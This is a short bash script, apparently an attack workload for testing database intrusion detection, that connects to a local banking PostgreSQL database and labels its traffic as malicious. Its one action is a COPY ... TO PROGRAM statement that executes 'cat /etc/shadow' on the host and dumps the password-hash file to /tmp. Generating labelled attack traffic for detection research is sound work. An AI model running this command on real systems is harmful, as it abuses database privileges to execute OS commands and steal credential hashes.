#!/usr/bin/env bash
# 4D OOD workload -- adapted from ../attack_workload/attack_priv_var_cat_shadow.sh (legacy: casce_tpcb, -U postgres).
# Only connection and label changed; the OS command itself is unchanged.
set -u
REPEAT=${REPEAT:-1}
PSQL="psql -X -q -h 127.0.0.1 -d casce_banking"

echo "4D: OS command execution (cat /etc/shadow), repeat ${REPEAT}..."
PGAPPNAME="casce_label=Malicious:os_cat_shadow_r${REPEAT}" \
  $PSQL -U teller -c "COPY (SELECT 1) TO PROGRAM 'cat /etc/shadow > /tmp/out_cat_shadow.txt 2>/dev/null || true';"
